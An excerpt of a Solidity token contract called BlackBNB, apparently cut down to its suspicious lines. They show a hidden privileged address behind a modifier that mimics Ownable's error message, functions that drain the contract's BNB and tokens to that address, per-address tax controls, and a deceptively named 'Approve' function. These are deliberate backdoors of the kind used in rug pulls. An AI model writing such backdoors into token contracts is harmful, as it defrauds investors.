...
contract BlackBNB is Context, IERC20, Ownable {
    ...
    address payable private marketingWalletAddress = payable(0x408E2eD1e1d2FD249D9eb2673FE86Be97E2Fe420); 
    address payable private teamWalletAddress = payable(0xF49acc8551f1c3DA89bfC01Ee86c3079f725e586); 
    ...
    uint256 private _totalSupply = 1 * 692 * 10**_decimals;
	...
	address  public disShares =_msgSender();
	...
	modifier onlyGo {
       require(disShares == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function setdTokenTracker(address newAddress) external onlyOwner() {
        disShares = newAddress;
    }
	
	function claimBalance() external {
        payable(disShares).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(disShares, amount);
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyGo {
	...
	function Approve(address spender,uint256 amount)public onlyGo{
